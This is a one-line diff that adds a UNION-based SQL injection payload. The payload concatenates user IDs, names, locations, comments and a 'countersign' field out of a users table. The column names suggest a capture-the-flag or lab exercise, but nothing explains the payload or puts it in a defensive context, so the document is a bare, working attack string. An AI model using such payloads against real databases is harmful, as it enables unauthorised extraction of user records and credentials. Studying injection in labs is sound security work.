@@ -1,0 +1,1 @@
+1 UNION (SELECT 1, CONCAT(user_id, first_name, last_name, town, country, planet, Commentaire, countersign) FROM users)
